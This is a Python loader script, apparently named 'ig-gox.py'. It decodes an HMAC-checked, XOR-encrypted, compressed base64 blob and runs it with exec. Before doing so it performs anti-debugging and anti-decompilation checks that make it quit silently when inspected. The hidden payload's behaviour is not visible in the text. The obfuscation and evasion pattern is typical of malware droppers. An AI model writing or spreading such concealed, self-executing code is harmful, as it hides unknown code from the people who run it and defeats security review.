import sys, os, zlib, base64, hashlib, hmac, builtins

class _0x7154:
    _K = (0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4)
    @classmethod
    def _perm(cls, x, y):
        return ((x << 7 | x >> 25) ^ (y << 11 | y >> 21) ^ (x & y)) & 0xFFFFFFFF
    @classmethod
    def _0xe84c(cls, b):
        _s = 0x6A09E667
        for _i, _v in enumerate(b[:min(len(b), 64)]):
            _s = (_s ^ cls._perm(_v * 31, cls._K[_i % len(cls._K)])) & 0xFFFFFFFF
        return _s

def _0x89c3(_buf):
    _acc = 0x811C9DC5
    for _b in _buf[:min(len(_buf), 128)]:
        _acc = ((_acc ^ _b) * 0x01000193) & 0xFFFFFFFF
    return _acc

def _0x2a05():
    if getattr(sys, 'gettrace', None) and sys.gettrace() is not None:
        sys.exit(0)
    for _fn in (builtins.exec, builtins.eval, builtins.compile):
        if hasattr(_fn, '__code__') or type(_fn) is not type(len):
            sys.exit(0)
    _env = (os.getcwd() + " " + " ".join(sys.argv)).lower()
    for _b in ('uncompyle', 'pycdc', 'decompyle', 'deobfuscate', 'hook', 'frida'):
        if _b in _env:
            sys.exit(0)

_0x2a05()

_0x4d1c = ((0x1337 * 0x7) ^ 0x8695) & 0xFF
if _0x4d1c == 0xAA:
    _d_seq = [chr(_x) for _x in range(128)]
    exec("".join(_d_seq))

_DATA = "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"
_0x29c2 = bytes.fromhex("fa8ea7de93a1fc259f56abb457049f03283d3c7dbdbbcb8fc2788a068232bb03")
_0x5899 = bytes.fromhex("0e42c879494b49931c9493d1bcba6ae7")
_0x65fe = "fd9377664476e73e1ea967000363200a7444e13ed4221bf72a15a9e7d65c8f58"

_0xaa1d = base64.b64decode(_DATA)

_0x_d_mix = _0x7154._0xe84c(_0xaa1d)
if _0x_d_mix == 0x00:
    sys.exit(0)

if hmac.new(_0x5899, _0xaa1d, hashlib.sha256).hexdigest() != _0x65fe:
    sys.exit(0)

_0xe9f4 = bytes([_0xaa1d[_i] ^ _0x29c2[_i % len(_0x29c2)] for _i in range(len(_0xaa1d))])
try:
    _0x1a54 = zlib.decompress(_0xe9f4).decode('utf-8')
except Exception:
    sys.exit(0)

_0x4bf6 = os.path.abspath(__file__) if '__file__' in globals() else 'ig-gox.py'
exec(compile(_0x1a54, "<gox_core>", "exec"), {"__name__": "__main__", "__file__": _0x4bf6})
